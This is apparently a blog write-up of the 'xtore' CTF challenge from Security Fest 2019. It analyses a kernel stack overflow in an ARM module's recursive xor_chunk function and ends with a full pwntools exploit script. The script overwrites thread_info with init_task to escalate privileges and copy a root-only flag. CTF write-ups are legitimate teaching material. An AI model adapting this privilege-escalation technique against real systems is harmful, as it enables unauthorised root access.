---
title: xtore - Security Fest 2019
date: "2019-05-28 21:14:39"
layout: post
---

I was unable to participate much during the CTF, but this challenge looked interesting and I wanted to give it a try afterwards :)

We're given an archive containing a qemu wrapper and a rootfs, which when extracted has an arm kernel module `xtore.ko` and a fake flag in `/root/flag`.

Looking at the module in Ghidra, we can see that in `mod_init` two proc entries at `/proc/xtore/xor` and `/proc/xtore/key` are created.

During the CTF, one of my teammates mementomori found that if you write enough data to `/proc/xtore/xor` in one go then you get a kernel crash. The function that handles the xor write is:

```c
ssize_t xor_write(file *file, char *ubuf, size_t count,loff_t *off) {
  char *dest;
  xor_entry *entry;
  int i;
  cred *creds;

  if (xor_count < 0x100) {
    entry = xor_entries;
    i = 0;
    do {
      if ((entry->len == 0) && (entry->data == NULL)) {
        creds = get_current()->cred;
        dest = kmalloc(count, 0x80d0);
        if (dest == 0) {
          return -0xc;
        }
        xor_entries[i].uid = creds->uid;
        xor_entries[i].len = count;
        xor_entries[i].data = dest;
        xor_chunk(dest, ubuf, count);
        xor_count = xor_count + 1;
        return count;
      }
      i += 1;
      entry = entry + 1;
    } while (i != 0x100);
  }
  return -0xc;
}
```

So it loops through the `xor_entries` array until it finds a free slot, then calls `xor_chunk` which is something like:

```c

void xor_chunk(char *dest, char *ubuf, size_t count) {
  char chunk[512];

  if (!access_ok(ubuf, 0x200)) {
    __memzero(chunk, 0x200);
    return;
  }
  uint res = __copy_from_user(chunk, ubuf, 0x200);
  if (res == 0) {
    uint i = count;
    if (0x1ff < count) {
      i = 0x200;
    }
    if (count == 0) {
      memcpy(dest, chunk, i);
    } else {
      char *c = &chunks[-1];
      do {
        c = c + 1;
        res += 1;
        *c = xor_key[res] ^ c[0];
      } while (res < i);
      memcpy(dest, chunk, i);
      if (count - i != 0) {
        xor_chunk(dest + i, ubuf + i, count - i);
      }
    }
  }
}
```

This function is splitting off up to 0x200 bytes of data from ubuf, xoring it with the key, the calling xor_chunk again with the remaining data.

The issue is that the kernel stack space is very limited, so if we call it with a large enough size then will will hit the base of the stack and will start overwriting the [thread_info](https://elixir.bootlin.com/linux/v3.16.67/source/arch/arm/include/asm/thread_info.h#L50).

Initially I started trying to create a fake `struct task_struct` with a fake `cred`, but then realized that I could just replace it with `init_task` instead.

As there were still a bunch of things that had been replaced, I ended up open the flag and writing it to another file that the user could access, then went into an infinite loop to prevent the kernel from crashing.

```python
#!/usr/bin/env python2

import logging
from pwn import *


def cmd(c):
    p.sendlineafter("$ ", c)


def upload(gzip):
    cmd("cd")

    prog = log.progress("Upload")

    with open(gzip, "rb") as f:
        data = f.read()

    encoded = base64.b64encode(data)

    for i in range(0, len(encoded), 300):
        prog.status("%d / %d" % (i, len(encoded)))
        cmd("echo %s >> benc" % (encoded[i:i+300]))

    cmd("cat benc | base64 -d | gzip -d > bout")
    cmd("chmod +x bout")
    prog.success()


def str2bytes(s):
    return ", ".join(map(lambda c: str(ord(c)), s))


init_task = 0x80433360


def exploit():
    fake_thread_info = ""
    fake_thread_info += p32(0)*2 + p32(0x7f000000) + p32(init_task)

    payload = ""
    payload += shellcraft.echo("Start\n")
    payload += shellcraft.open("/proc/xtore/xor", 'O_RDWR')
    payload += shellcraft.mov("r6", "r0")

    payload += "ldr r5, =buf\n"
    payload += shellcraft.write('r6', 'r5', (0x200*14 + 0x1))
    payload += shellcraft.open("/root/flag", 'O_RDONLY')

    payload += shellcraft.read('r0', 'sp', 0x100)
    payload += shellcraft.open("/home/user/flag", 'O_RDWR')
    payload += shellcraft.write('r0', 'sp', 0x100)
    payload += shellcraft.infloop()

    payload += ".data\n"
    payload += "buf: .ds.b 7224, 0\n"
    payload += ".byte {}\n".format(str2bytes(fake_thread_info))

    with context.local(log_level='debug'):
        pwn = make_elf_from_assembly(payload, extract=True)
        write("pwn", pwn)
        print process("gzip --best -k -f ./pwn", shell=True).recvall()

    upload("pwn.gz")

    cmd("touch /home/user/flag")
    cmd("./bout &")
    cmd("sleep 1 && cat flag")

    p.interactive()

    """
    [+] Starting local process '/bin/sh' argv=['gzip --best -k -f ./pwn'] : pid 16070
    [+] Receiving all data: Done (0B)
    [*] Process '/bin/sh' stopped with exit code 0 (pid 16070)

    [+] Upload: Done
    [*] Switching to interactive mode
    sleep 1 && cat flag
    Start
    /home/user/flag\x00this is not the flag, so do it on the remote machine..."
    """

if __name__ == "__main__":
    context.terminal = ["tmux", "sp", "-h"]
    context.arch = "arm"

    if len(sys.argv) > 1:
        p = remote("xtore-01.pwn.beer", 1337)
    else:
        p = process("./chall", shell=True, env={})

    exploit()
```
